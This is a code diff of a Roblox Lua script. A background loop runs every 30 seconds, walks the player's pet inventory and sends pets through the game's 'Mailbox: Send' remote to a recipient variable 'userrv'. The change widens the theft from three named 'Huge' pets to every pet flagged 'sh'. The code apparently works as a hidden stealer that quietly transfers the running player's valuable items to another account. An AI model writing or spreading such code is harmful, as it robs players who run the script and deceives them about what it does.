@@ -449,21 +449,12 @@ save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 task.spawn(function()
     while task.wait(30) do
 		for i, v in pairs(save.Inventory.Pet) do
-            if v.id == 'Huge Stealth Dragon' and v.sh then
+	            if v.sh then
 				local am = v._am or 1
 				game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(userrv,
                     content, "Pet", i, am)
 					task.wait(30)
-			elseif v.id == 'Huge Hacker Cat' and v.sh then
-				local am = v._am or 1
-				game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(userrv,
-                    content, "Pet", i, am)
-					task.wait(30)
-			elseif v.id == 'Huge Prison Cat' and v.sh then
-				local am = v._am or 1
-				game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(userrv,
-                    content, "Pet", i, am)
-					task.wait(30)
+			
 			end
 		end
 		
